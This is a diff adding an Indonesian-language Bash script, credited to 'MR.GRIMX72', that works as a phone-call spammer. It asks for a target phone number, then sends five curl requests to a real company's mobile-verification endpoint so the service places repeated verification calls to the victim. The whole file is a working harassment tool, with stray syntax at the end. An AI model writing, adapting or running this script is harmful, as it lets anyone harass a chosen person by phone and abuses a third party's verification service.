@@ -1,0 +1,60 @@
+clear
+
+
+red="\033[1;31m"
+blu="\033[1;96m"
+whi="\033[1;97m"
+bla="\033[90m"
+
+sleep 1
+echo
+echo "${blu} [!] Loading Cuk. . ."
+sleep 1
+echo "${blu} Orang sabar di sayang tuhan:)"
+sleep 10
+clear
+sleep 1
+echo "${whi}SPAM TELEFON ULIMETED V1"
+sleep 1
+echo "${bla}--------------------------------------"
+echo "${whi} Author :${blu} MR.GRIMX72"
+echo "${whi} Youtube:${blu} Belum Ada"
+echo "${whi} Version:${blu} Spam Telefon V1"
+echo "${bla}--------------------------------------\n${whi}"
+
+          
+sleep 1
+read -p "[+] Masukan No Target : " no
+link="https://id.jagreward.com/member/verify-mobile/$no"
+echo
+sleep 5
+echo "${blu}[1].Spam Call Succes:)"
+curl -s $link
+sleep 5
+link2="https://id.jagreward.com/member/verify-mobile/$no"
+echo
+sleep 5
+echo "${blu}[2].Spam Call Succes:)"
+curl -s $link2
+link3="https://id.jagreward.com/member/verify-mobile/$no"
+echo
+sleep 5
+echo "${blu}[3].Spam Call Succes:)"
+curl -s $link3
+link4="https://id.jagreward.com/member/verify-mobile/$no"
+echo
+sleep 5
+echo "${blu}[4].Spam Call Succes:)"
+curl -s $link4
+link5="https://id.jagreward.com/member/verify-mobile/$no"
+echo
+sleep 5
+echo "${blu}[5].Spam Call Succes:)"
+curl -s $link5
+sleep 1
+echo
+figlet Selesai | lolcat
+exit
+fi
+;
+echo
